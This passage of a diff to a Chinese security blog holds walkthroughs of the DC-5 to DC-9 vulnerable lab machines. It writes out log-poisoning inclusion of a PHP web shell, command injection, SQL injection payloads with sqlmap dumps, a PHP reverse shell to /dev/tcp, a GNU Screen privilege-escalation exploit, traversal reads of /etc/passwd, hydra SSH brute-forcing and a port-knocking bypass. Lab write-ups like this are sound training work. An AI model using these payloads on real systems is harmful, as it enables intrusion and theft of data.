class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure>
 
@@ -4733,9 +4718,9 @@
 <p>我们再尝试一下错误日志，这里可能会有刚才的报错信息</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.234</span><span class="hljs-number">.134</span>/thankyou.php?<span class="hljs-built_in">file</span>=/var/<span class="hljs-built_in">log</span>/nginx/error.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-56.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-56.png"></p>
 <p>可以看到右下角有我们刚才的包含的一句话木马，但是这里无法用蚁剑连接，因为再请求前我们的一句话木马变成了url编码。</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-57.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-57.png"></p>
 <p>所以这里要先抓包，然后把url编码解码再发送请求就能getshell了</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.234</span><span class="hljs-number">.134</span>/thankyou.php?<span class="hljs-built_in">file</span>=/var/<span class="hljs-built_in">log</span>/nginx/error.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
 
@@ -4750,7 +4735,7 @@
 <p>开启交互式终端</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-58.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-58.png"></p>
 <hr>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID文件（此文件可以以文件所有者的身份<strong>执行文件</strong>）</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
@@ -4763,7 +4748,7 @@
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit screen</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>searchsploit 检索漏洞，可以找到一个本地提权漏洞，并且有exp</strong></p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-59.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-59.png"></p>
 <p>先查找exp位置</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts">searchsploit screen -p <span class="hljs-number">41154</span><br><br><span class="hljs-meta">#</span><br>[!] Could not find EDB-ID <span class="hljs-meta">#</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  Exploit:</span> GNU Screen <span class="hljs-number">4.5</span><span class="hljs-number">.0</span> - Local Privilege Escalation<br><span class="hljs-symbol">      URL:</span> https:<span class="hljs-comment">//www.exploit-db.com/exploits/41154</span><br><span class="hljs-symbol">     Path:</span> <span class="hljs-keyword">/usr/</span>share<span class="hljs-keyword">/exploitdb/</span>exploits<span class="hljs-keyword">/linux/</span>local/<span class="hljs-number">41154.</span>sh<br><span class="hljs-symbol">    Codes:</span> N/A<br><span class="hljs-symbol"> Verified:</span> True<br>File Type: Bourne-Again shell script, ASCII text executable<br><br></code></pre></td></tr></table></figure>
 
@@ -4788,7 +4773,7 @@
 <hr>
 <h1 id="DC-6靶机"><a href="#DC-6靶机" class="headerlink" title="DC-6靶机"></a>DC-6靶机</h1><h2 id="主机发现、端口扫描"><a href="#主机发现、端口扫描" class="headerlink" title="主机发现、端口扫描"></a>主机发现、端口扫描</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 主机发现</span><br><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.234.0</span>/<span class="hljs-number">24</span><br><br><span class="hljs-comment"># 192.168.234.135</span><br><br><br><span class="hljs-comment"># 全速全端口SYN扫描指纹信息</span><br><span class="hljs-attribute">nmap</span> -sSV <span class="hljs-number">192.168.234.135</span> -p- -T5<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-60.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-60.png"></p>
 <p>发现网站无法访问，而且自动跳转到了一个域名</p>
 <p><code>wordy</code></p>
 <p>那么就需要添加一个host解析</p>
@@ -4808,14 +4793,14 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>wordy<span class="hljs-regexp">/wp-admin/</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p><img src="C:/Users/Administrator/myBlog/source/image/ISW-61.png"></p>
+<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-61.png"></p>
 <p>发现是wordpress</p>
 <p><strong>WordPress 是全球最流行的开源网站内容管理系统（CMS）</strong>，用于快速搭建网站、博客、电商平台等。</p>
 <hr>
 <h2 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h2><p>这里要用到一个工具，WPScan，一个专门为wordpress准备的信息收集工具</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//wordy/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-62.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-62.png"></p>
 <p>拿到一些信息</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.25</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//wordy/xmlrpc.php</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//wordy/readme.html</span><br></code></pre></td></tr></table></figure>
 
@@ -4829,7 +4814,7 @@
 
 <p>发现IP tools，可能有命令拼接</p>
 <p>试试convert</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-63.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-63.png"></p>
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &amp;&amp; nc<br></code></pre></td></tr></table></figure>
 
 <p>然后抓包看看，把nc改成whoami</p>
@@ -4887,7 +4872,7 @@
 <h1 id="DC-7靶场"><a href="#DC-7靶场" class="headerlink" title="DC-7靶场"></a>DC-7靶场</h1><h2 id="主机发现-端口扫描"><a href="#主机发现-端口扫描" class="headerlink" title="主机发现&amp;端口扫描"></a>主机发现&amp;端口扫描</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.234.0</span>/<span class="hljs-number">24</span><br><br>nmap -sSV <span class="hljs-number">192.168.234.136</span> -p- -T5<br><br>nmap -sSV <span class="hljs-number">192.168.234.136</span> -p- -O<br><br>-O<br>启用操作系统指纹识别，尝试检测目标主机的操作系统类型和版本<br></code></pre></td></tr></table></figure>
 
 <p>访问80端口</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-64.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-64.png"></p>
 <p>尝试sql注入</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">123</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+<br></code></pre></td></tr></table></figure>
 
@@ -4918,7 +4903,7 @@
 <h2 id="Drush"><a href="#Drush" class="headerlink" title="Drush"></a>Drush</h2><p>Drush 是一个强大的 shell 接口，可以直接从云服务器命令行管理 Drupal。</p>
 <p>可以使用drush命令，看看用户管理方面的命令</p>
 <p>注意：要先到网站的根目录下，才能用Drush命令</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-65.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-65.png"></p>
 <p>尝试用drush命令添加新用户</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">先切到网站根目录<br><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www/html</span><br><br>使用drush命令创建新用户<br>drush user-create baixiaoyu <span class="hljs-params">--mail=</span><span class="hljs-string">&quot;baibai@123.com&quot;</span> <span class="hljs-params">--password=</span><span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure>
 
@@ -4927,7 +4912,7 @@
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">drush <span class="hljs-keyword">user</span>-<span class="hljs-keyword">password</span> <span class="hljs-keyword">admin</span> <span class="hljs-comment">--password=&quot;123456&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>修改源码，添加一句话木马，但是没用，因为这里只能选择html格式</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-66.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-66.png"></p>
 <h2 id="添加插件getshell"><a href="#添加插件getshell" class="headerlink" title="添加插件getshell"></a>添加插件getshell</h2><p>可以用这个插件，我们去安装一个插件，在这里下载</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.drupal.org/project/php/releases/<span class="hljs-number">8</span>.x-<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
@@ -4936,14 +4921,14 @@
 
 <p>找找后台添加插件的地方</p>
 <p>在extend的list下，有install new moudle</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-67.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-67.png"></p>
 <p>我这里下载失败了，然后换成8.x-1.0就可以了</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://ftp.drupal.org/files/projects/php-<span class="hljs-number">8</span>.x-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.tar.gz<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-68.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-68.png"></p>
 <p>选择下面的Enable newly added modules启用插件</p>
 <p>然后筛选php这个插件点安装</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-69.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-69.png"></p>
 <p>然后再去改首页源码，添加一句话木马</p>
 <p>注意这里改phpcode会自动转义成html，重新写就行了</p>
 <p>连接成功</p>
@@ -4963,7 +4948,7 @@
 
 <p>然后就是漫长的等待</p>
 <p>成功反弹shell</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-70.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-70.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><br>python -c <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><br><span class="hljs-built_in">cd</span> /root<br><br><span class="hljs-built_in">ls</span><br><br><span class="hljs-built_in">cat</span> theflag.txt<br></code></pre></td></tr></table></figure>
 
 <hr>
@@ -4975,12 +4960,12 @@
 <p>尝试sql注入</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.234.137</span>/?nid=<span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-71.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-71.png"></p>
 <p>发现有报错，存在sql注入漏洞</p>
 <p>用报错注入爆出库名<code>d7db</code></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.234.137</span>/?nid=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=updatexml(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,(select database())),<span class="hljs-number">3</span>) --+<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-72.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-72.png"></p>
 <p>并且目录扫描扫到robots.txt，访问有个user&#x2F;login</p>
 <h2 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>这里先不管先去用sqlmap去爆出数据库</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby">爆表<br>sqlmap -u <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.234.137/</span><span class="hljs-string">?n</span>id=<span class="hljs-number">1</span> -p nid -D d7db --tables<br><br>爆数据<br>sqlmap -u <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.234.137/</span><span class="hljs-string">?n</span>id=<span class="hljs-number">1</span> -p nid -D d7db -T users --columns<br><br>sqlmap -u <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.234.137/</span><span class="hljs-string">?n</span>id=<span class="hljs-number">1</span> -p nid -D d7db -T users -C name,pass --dump<br><br></code></pre></td></tr></table></figure>
@@ -4992,10 +4977,10 @@
 <p>然后</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">john <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-73.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-73.png"></p>
 <p>爆出第二个用户的密码 <code>turtle</code></p>
 <p>登录</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-74.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-74.png"></p>
 <p>这里有一个contact us，提交一下看看</p>
 <p>看到了提交成功后的内容</p>
 <p>点击这里有个Webform</p>
@@ -5003,10 +4988,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> echp <span class="hljs-string">&quot;我的表单&quot;</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>成功打印</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-75.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-75.png"></p>
 <h2 id="反弹shell-2"><a href="#反弹shell-2" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>证明了可以执行php代码，那么就可以反弹shell</p>
 <p>使用谷歌插件HackTools生成反弹shell语句</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-76.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-76.png"></p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我的表单&quot;</span>;</span><br><span class="language-php"></span><br><span class="language-php">@<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.234.128/1234 0&gt;&amp;1&quot;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
 <p>反弹失败了。</p>
@@ -5022,7 +5007,7 @@
 <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -4000 -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br><br>这个命令的各个部分解释如下：<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/：从根目录/</span>开始搜索。<br><br>-perm -<span class="hljs-number">4000</span>：查找具有SUID权限的文件。SUID权限允许用户以文件所有者的权限执行该文件，而不是以用户自己的权限执行。这里的-<span class="hljs-number">4000</span>表示设置用户ID位（SUID位）。<br><br>-<span class="hljs-keyword">print</span>：将找到的文件路径打印到标准输出。这实际上是<span class="hljs-keyword">find</span>命令的默认行为，所以-<span class="hljs-keyword">print</span>可以省略。<br><br><span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>：将标准错误（文件描述符<span class="hljs-number">2</span>）重定向到<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>。这意味着如果<span class="hljs-keyword">find</span>命令在执行过程中遇到任何错误（比如权限不足无法访问某个目录），这些错误信息将不会被显示。<br></code></pre></td></tr></table></figure>
 
 <p>在Linux系统中，&#x2F;sbin文件夹通常包含了一系列系统管理员使用的可执行命令，那么就可以直接利用这命令&#x2F;软件，来提权</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-77.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-77.png"></p>
 <p>查看exim版本</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">exim <span class="hljs-comment">--versions</span><br></code></pre></td></tr></table></figure>
 
@@ -5065,7 +5050,7 @@
 <h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>存在sql注入</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-78.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-78.png"></p>
 <p>复制请求包，到一个文件里面，使用sqlmap跑，因为这是post请求</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/results.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.234.138<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>22<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.234.138<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.234.138/search.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-routeros"><span class="hljs-attribute">search</span>=1&#x27;or <span class="hljs-attribute">1</span>=1#</span><br></code></pre></td></tr></table></figure>
 
@@ -5085,7 +5070,7 @@
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"># 步骤<span class="hljs-number">1</span>：先导出数据（不加 <span class="hljs-attr">--crack</span>）<br>sqlmap -<span class="hljs-attribute">r</span> post<span class="hljs-selector-class">.txt</span> -D Staff -T Users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br><br># 步骤<span class="hljs-number">2</span>：单独使用 <span class="hljs-attr">--crack</span> 破解导出的哈希<br>sqlmap <span class="hljs-attr">--crack</span> hash<br></code></pre></td></tr></table></figure>
 
 <p>没想到sqlmap能破解，hashcat不行</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-79.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-79.png"></p>
 <p>登录</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">admin</span><br>transorbital1<br></code></pre></td></tr></table></figure>
 
@@ -5102,23 +5087,23 @@
 <p>没反应，猜测源码是路径拼接的</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/manage.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-80.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-80.png"></p>
 <h2 id="SSH爆破-hydra"><a href="#SSH爆破-hydra" class="headerlink" title="SSH爆破-hydra"></a>SSH爆破-hydra</h2><p>基本上所有的注入点都没了，还剩下之前那个users库里的表</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-81.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-81.png"></p>
 <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">vim <span class="hljs-keyword">user</span>.txt<br>vim <span class="hljs-built_in">pass</span>.txt<br><br>hydra -L <span class="hljs-keyword">user</span>.txt -P <span class="hljs-built_in">pass</span>.txt -vV -t <span class="hljs-number">5</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">234.138</span> ssh<br></code></pre></td></tr></table></figure>
 
 <p>ssh也不行了，服务被禁用了</p>
 <h3 id="端口敲门-knockd服务-绕过技术"><a href="#端口敲门-knockd服务-绕过技术" class="headerlink" title="端口敲门 (knockd服务) 绕过技术"></a>端口敲门 (knockd服务) 绕过技术</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">如果存在knockd服务。<br>该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来<span class="hljs-string">&quot;敲门&quot;</span>，使系统开启需要访问的服务端口，才能对外访问。<br>不使用时，再使用自定义的序列号来<span class="hljs-string">&quot;关门&quot;</span>，将端口关闭，不对外监听。进一步提升了服务和系统的安全<br><br><span class="hljs-regexp">//</span>配置文件路径<br>默认配置文件是：<span class="hljs-regexp">/etc/</span>knockd.conf<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-82.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-82.png"></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//自定义端口后，依次对其进行敲门，然后就可以开启ssh服务进行连接了</span><br><span class="hljs-comment">//命令如下：</span><br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">234.138</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">7469</span><br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">234.138</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8475</span><br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">234.138</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">9842</span><br><span class="hljs-comment">//执行完成过后，重新扫描22端口，即可发现ssh服务已经开启，可以访问</span><br></code></pre></td></tr></table></figure>
 
 <p>然后再看ssh22端口已经开启</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-83.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-83.png"></p>
 <p>这个时候再去爆破ssh连接即可</p>
